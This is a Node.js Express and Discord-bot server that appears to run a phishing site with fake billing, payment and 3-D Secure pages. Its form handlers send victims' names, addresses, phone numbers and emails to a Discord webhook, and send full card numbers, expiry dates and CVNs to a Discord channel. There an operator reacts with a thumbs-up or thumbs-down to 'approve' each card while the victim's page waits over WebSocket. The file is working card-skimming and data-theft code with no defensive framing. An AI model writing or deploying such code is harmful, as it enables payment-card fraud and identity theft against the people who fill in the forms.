const express = require('express');
const path = require('path');
const http = require('http');
const WebSocket = require('ws');
const { Client, GatewayIntentBits } = require('discord.js');
const app = express();
const port = process.env.PORT || 3000;

// WebSocket server
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Discord Bot setup
const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent, 
        GatewayIntentBits.GuildMessageReactions 
    ] 
});

const botToken = process.env.DISCORD_BOT_TOKEN; // Use Heroku config var for bot token
const channelId = process.env.CHANNEL_ID; // Use Heroku config var for channel ID

let currentMessageId = null; // Track the current message ID for approval/rejection

client.once('ready', () => {
    console.log('Discord bot is ready!');
});

client.on('messageReactionAdd', async (reaction, user) => {
    if (reaction.message.id === currentMessageId) {
        const thumbsUpEmoji = '👍';

        let status = 'rejected';
        if (reaction.emoji.name === thumbsUpEmoji) {
            status = 'approved';
        }

        // Notify WebSocket clients
        wss.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.send(JSON.stringify({ status }));
            }
        });

        // If approved, stop listening to further reactions
        if (status === 'approved') {
            currentMessageId = null;
        }
    }
});

client.login(botToken);

async function getLatestAmountFromDiscord(channelId, botToken) {
    const fetch = (await import('node-fetch')).default;
    const url = `https://discord.com/api/v10/channels/${channelId}/messages?limit=10`;
    const response = await fetch(url, {
        headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bot ${botToken}`
        }
    });

    if (!response.ok) {
        console.error('Error fetching messages from Discord:', response.statusText);
        return null;
    }

    const messages = await response.json();
    for (const message of messages) {
        if (message.content && message.content.includes('Captured amount:')) {
            const match = message.content.match(/Captured amount: ([\d.]+)/);
            if (match && match[1]) {
                return match[1];
            }
        }
    }

    return null;
}

async function sendApprovalRequest(channelId, botToken, content) {
    const fetch = (await import('node-fetch')).default;
    const url = `https://discord.com/api/v10/channels/${channelId}/messages`;
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bot ${botToken}`
        },
        body: JSON.stringify({ content })
    });

    if (!response.ok) {
        console.error('Error sending approval request to Discord:', response.statusText);
        return null;
    }

    const message = await response.json();
    return message.id;
}

async function addReaction(channelId, messageId, botToken, emoji) {
    const fetch = (await import('node-fetch')).default;
    const url = `https://discord.com/api/v10/channels/${channelId}/messages/${messageId}/reactions/${emoji}/@me`;
    const response = await fetch(url, {
        method: 'PUT',
        headers: {
            'Authorization': `Bot ${botToken}`
        }
    });

    if (!response.ok) {
        console.error('Error adding reaction to message:', response.statusText);
    }
}

async function fetchReactionsForEmoji(channelId, messageId, botToken, emoji) {
    const fetch = (await import('node-fetch')).default;
    const url = `https://discord.com/api/v10/channels/${channelId}/messages/${messageId}/reactions/${emoji}`;
    const response = await fetch(url, {
        headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bot ${botToken}`
        }
    });

    if (!response.ok) {
        console.error(`Error fetching reactions for ${emoji} from Discord:`, response.statusText);
        return [];
    }

    const users = await response.json();
    return users;
}

app.post('/submit-form', async (req, res) => {
    const fetch = (await import('node-fetch')).default;
    const webhookUrl = process.env.WEBHOOK_URL; // Use Heroku config var for webhook URL
    const formData = req.body;

    const message = `
**First Name:** ${formData.first_name}
**Last Name:** ${formData.last_name}
**Address Line 1:** ${formData.address1}
**Address Line 2:** ${formData.address2}
**City:** ${formData.city}
**Country:** ${formData.country}
**Postal Code:** ${formData.postal_code}
**Phone:** ${formData.phone}
**Email:** ${formData.email}
    `;

    const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ content: message }),
    });

    if (!response.ok) {
        console.error('Error sending data to Discord:', response.statusText);
        res.status(500).send('Error submitting form data');
    } else {
        res.redirect('/payment'); // Redirect to the /payment URL
    }
});

app.get('/billing', async (req, res) => {
    const latestAmount = await getLatestAmountFromDiscord(channelId, botToken);
    const displayAmount = latestAmount ? `₱${latestAmount}` : '₱1,000.00';
    res.render('billing', { displayAmount });
});

app.get('/payment', async (req, res) => {
    const latestAmount = await getLatestAmountFromDiscord(channelId, botToken);
    const displayAmount = latestAmount ? `₱${latestAmount}` : '₱1,000.00';
    res.render('payment', { displayAmount });
});

app.get('/3ds', async (req, res) => {
    const latestAmount = await getLatestAmountFromDiscord(channelId, botToken);
    const displayAmount = latestAmount ? `₱${latestAmount}` : '₱1,000.00';
    res.render('3ds', { displayAmount });
});

app.post('/submit-payment', async (req, res) => {
    const fetch = (await import('node-fetch')).default; // Dynamic import
    const formData = req.body;

    const messageContent = `
**Card Type:** ${formData.card_type}
**Card Number:** ${formData.card_number}
**Expiration Month:** ${formData.expiry_month}
**Expiration Year:** ${formData.expiry_year}
**CVN:** ${formData.cvn}
Do you want to approve this transaction?
`;

    const messageId = await sendApprovalRequest(channelId, botToken, messageContent);
    if (messageId) {
        currentMessageId = messageId; // Track the current message ID
        await addReaction(channelId, messageId, botToken, encodeURIComponent('👍'));
        await addReaction(channelId, messageId, botToken, encodeURIComponent('👎'));
        res.json({ success: true });
    } else {
        res.status(500).send('Error submitting payment data');
    }
});

// WebSocket connection handler
wss.on('connection', ws => {
    console.log('Client connected');

    ws.on('message', message => {
        console.log('Received message:', message);
    });

    ws.on('close', () => {
        console.log('Client disconnected');
    });
});

server.listen(port, () => {
    console.log(`Server running at http://localhost:${port}/`);
});
